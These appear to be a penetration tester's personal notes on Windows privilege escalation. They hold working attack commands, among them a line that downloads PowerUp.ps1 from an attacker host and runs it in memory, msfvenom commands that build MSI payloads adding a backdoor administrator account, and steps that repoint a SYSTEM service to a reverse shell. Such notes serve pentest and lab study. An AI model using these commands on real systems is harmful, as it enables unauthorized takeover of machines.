## RunasCs.exe
Windows script to run specific processes under a different user account
```powershell
PS > .\RunasCs.exe $Username $Password $Command
```
Command can be like `msfvenom reverse shell`
# Processes
Check running processes, could hint at possible VM machine, prompting [[VM Escape]].
# Services
## Service
- Check all services with `sc query`
```cmd
> sc.exe query state=all
```
- Query configuration of a service
```powershell
PS > sc qc <service>
```
- Check access
## Access Check 
- Check `<user>` access to a particular  `service`
```powershell
PS > accesschk /accepteula -uwcqv <user> <service>
```
## Service Permissions
# PowerUp.ps1
```powershell
PS > iex (iwr -usebasicparsing http://<IP>:<PORT>/PowerUp.ps1)
PS > Invoke-AllChecks
```
# Dangerous Settings
## #AlwaysInstallElevated 
Use [[Tools/Frameworks/Metasploit#Generate Payload]] to create `.msi` reverse-shell and send it with [[File Transfer]]
```shell-session
$ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
$ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
## #service_change_config 
If the service runs with `SYSTEM` privileges, change the binary path of the service to our malicious reverse shell and restart it.
```powershell
> sc config <service> binpath= "\"C:\Path\to\rev-shell""
> net start <service>
```

